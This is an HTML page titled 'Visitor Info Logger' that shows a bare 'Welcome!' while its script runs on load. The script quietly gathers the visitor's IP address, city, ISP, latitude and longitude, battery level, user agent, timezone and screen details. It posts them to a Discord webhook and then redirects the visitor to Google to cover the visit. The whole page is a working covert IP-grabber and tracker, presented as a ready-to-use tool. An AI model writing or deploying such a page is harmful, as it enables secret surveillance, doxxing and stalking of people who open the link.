<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Visitor Info Logger</title>
</head>
<body>
    <h1>Welcome!</h1>
    <script>
        const webhookURL = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_URL';

        // Fetch IP and location details using IP-API
        function getIPAddressAndLocation() {
            return fetch('http://ip-api.com/json/')
                .then(response => response.json())
                .then(data => ({
                    ip: data.query,
                    location: `${data.city}, ${data.regionName}, ${data.country}`,
                    isp: data.isp,
                    lat: data.lat,
                    lon: data.lon,
                }))
                .catch(error => console.error('Error fetching location info:', error));
        }

        // Fetch battery info
        function getBatteryInfo() {
            if (navigator.getBattery) {
                return navigator.getBattery().then(battery => `${(battery.level * 100).toFixed(0)}%`);
            } else {
                return Promise.resolve('Battery info not available');
            }
        }

        // Collect basic device details
        function getDeviceInfo() {
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const language = navigator.language;
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

            const screenResolution = `${window.screen.width}x${window.screen.height}`;
            const screenOrientation = window.innerWidth > window.innerHeight ? 'Landscape' : 'Portrait';
            const windowDimensions = `${window.innerWidth}x${window.innerHeight}`;
            const isMobile = /Mobi|Android/i.test(userAgent) ? 'Yes' : 'No';

            return `
                User-Agent: ${userAgent}
                Platform: ${platform}
                Language: ${language}
                Timezone: ${timezone}
                Screen Resolution: ${screenResolution}
                Screen Orientation: ${screenOrientation}
                Window Dimensions: ${windowDimensions}
                Mobile Device: ${isMobile}
            `;
        }

        // Send data to Discord webhook
        function sendToDiscord(data) {
            const payload = {
                embeds: [{
                    title: "New Visitor Information",
                    color: 7506394,
                    fields: [
                        { name: "IP Address", value: data.ip, inline: true },
                        { name: "Location", value: data.location, inline: true },
                        { name: "ISP", value: data.isp, inline: true },
                        { name: "Coordinates", value: `Lat: ${data.lat}, Lon: ${data.lon}`, inline: true },
                        { name: "Battery Level", value: data.battery, inline: true },
                        { name: "Device Info", value: data.deviceInfo, inline: false },
                    ],
                    footer: { text: `Logged at ${new Date().toLocaleString()}` }
                }]
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
            }).then(response => {
                if (response.ok) {
                    console.log('Data sent successfully');
                } else {
                    console.error('Failed to send data:', response.statusText);
                }
            }).catch(error => console.error('Error sending to webhook:', error));
        }

        // Run data collection and send to webhook
        Promise.all([getIPAddressAndLocation(), getBatteryInfo()])
            .then(([locationData, battery]) => {
                const deviceInfo = getDeviceInfo();
                const data = { ...locationData, battery, deviceInfo };
                sendToDiscord(data);
            })
            .then(() => {
                // Redirect after data is sent
                setTimeout(() => {
                    window.location.href = "https://www.google.com";
                }, 3000); // Delay for 3 seconds before redirect
            });
    </script>
</body>
</html>
